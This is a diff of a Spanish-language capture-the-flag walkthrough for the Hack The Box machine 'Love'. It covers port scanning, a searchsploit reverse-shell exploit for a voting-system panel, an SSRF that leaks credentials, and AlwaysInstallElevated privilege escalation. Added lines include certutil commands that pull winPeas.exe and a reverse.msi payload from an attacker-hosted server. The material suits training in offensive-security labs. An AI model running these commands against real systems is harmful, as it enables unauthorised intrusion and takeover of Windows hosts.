@@ -22,31 +22,44 @@ Tags: #SQLI #SSRF #SearchSploit #WinPEAS #AlwaysInstalledElevated #Msfvenom
 ❯ nmap -p- --open --min-rate 5000 -sS -vvv -Pn -n IP -oG AllPorts  # Escaneo de puertos a la IP
 
 ❯ nmap -p<Ports> -sCV IP -oN Targeted                              # Scripts y version de los puertos encontrados
+
+❯ nmap --script http-enum -p80 IP    # Hacemos un escaneo de 'directorios' con un diccionario pequeño de 'nmap'
 ```
 
 ```bash 
 ❯ whatweb IP       # Miramos las tecnologias que corren en la web 
 
-❯ dirb IP          # Encontramos la ruta del admin
+❯ dirb IP          # Encontramos la ruta del '/admin'
+
+	# Podemos buscar vulnerabilidades con el nombre de la pagina 'Voting System' para ver si es un CMS
 ```
 
 ```bash 
 ❯ searchsploit votem system      # Mirar si existen exploits y probamos algunos exploits que nos llevan a la autenticacion en el 'votem system' como admin
+
+❯ searchsploit -x php/webapps/49445.py
+	# x = Examinar el contenido del archivo 
+
+❯ searchsploit -m php/webapps/49445.py
+	# m = Mover o traer el archivo a nuestra maquina de atacante 
+```
+
+## Otra manera
+
+```bash 
+# Con el puerto 443 abierto podemos enumerar los dominios 
+
+❯ openssl s_client -connect IP:443     # Inspeccionar el certificado para poder encontrar mas dominios los cuales podemos agregar a la ruta '/etc/hosts' de nuestra maquina de atacante 
 ```
 
 ```bash 
-# Con el puerto 443 abierto podemos enumerar los dominios, esto con el fin de poderlo hacer de otra manera. 
+# Encontramos en el dominio 'staging.love.htb' un escaner de archivos, el cual nos pide una URL. Por lo que colocamos la de nuestra maquina victima para probar.
 
-❯ openssl s_client -connect IP:443     # Inspeccionar el certificado 
-```
-
-```bash 
-# Encontramos en 'staging.love.htb' un escaner de archivos, el cual nos pide una URL. Por lo que colocamos la de nuestra maquina victima.
 
 ❯ python3 -m http.server 80      # Creamos un servidor para recibir la peticion 
 
 
-# Despues, hacemos peticiones desde la web hacia su 'localhost' por lo que se puede observar que existe un SSRF. Hacemos peticiones a los demas puertos http y en el 5000 encontramos un usuario y una passwd. 
+# Despues, hacemos peticiones desde la web hacia su 'localhost' por lo que se puede observar que existe un SSRF. Hacemos peticiones a los demas puertos http que encontramos en el escaneo con 'nmap' y en el 5000 encontramos un usuario y una passwd. 
 
 # Nos dirigimos al 'panel admin' y colocamos las credenciales 
 ```
@@ -54,7 +67,7 @@ Tags: #SQLI #SSRF #SearchSploit #WinPEAS #AlwaysInstalledElevated #Msfvenom
 ## User
 
 ```bash 
-# Una vez dentro del panel de 'votem system' buscamos el exploit en 'searchsploit' que nos ayudara a hacer una 'revershell' con un usuario autenticado. 
+# Una vez dentro del panel de 'votem system' buscamos el exploit en 'searchsploit' que nos ayudara a hacer una 'revershell' con un usuario 'autenticado'. Usamos el exploit en 'python', modificamos los parametros que nos pide y lo ejecutamos. 
 ```
 
 ```bash 
@@ -62,7 +75,7 @@ Tags: #SQLI #SSRF #SearchSploit #WinPEAS #AlwaysInstalledElevated #Msfvenom
 ```
 
 ```bash 
-# Para buscar una forma de escalar [privilegios es usando la herramienta de 'WinPeas' desde la siguiente URL
+# Para buscar una forma de escalar privilegios es usando la herramienta de 'WinPeas' que lo podemos descargar desde la siguiente URL:
 
 ❯ https://github.com/peass-ng/PEASS-ng/releases/tag/20240728-0f010225
 ```
@@ -70,9 +83,16 @@ Tags: #SQLI #SSRF #SearchSploit #WinPEAS #AlwaysInstalledElevated #Msfvenom
 ```bash 
 # Compartimos el archivo a la maquina Windows 
 
+❯ certutil.exe -f urlcache -split http://IP-Atacante/winPeas.exe winPeas.exe # Maquina victima descargaremos el ejecutable
 
+❯ python3 -m http.server 80       # Maquina atacante creamos un servidor para compartir el ejecutable
 ```
+
 ## Root
+
+```bash 
+❯ winPeas.exe    # Ejecutamos el archivo para buscar las vulnerabilidades en Windows 
+```
 
 ```bash 
 # Depues de ejecutar el 'WinPeas', se observa que encuentra 'AlwaysInstalledElevated' donde:
@@ -97,7 +117,9 @@ Tags: #SQLI #SSRF #SearchSploit #WinPEAS #AlwaysInstalledElevated #Msfvenom
 ```bash 
 # Compartimos el archivo a la maquina Windows 
 
+❯ certutil.exe -f urlcache -split http://IP-Atacante/reverse.msi reverse.msi # Maquina victima descargaremos el ejecutable
 
+❯ python3 -m http.server 80       # Maquina atacante creamos un servidor para compartir el ejecutable
 ```
 
 ```bash 
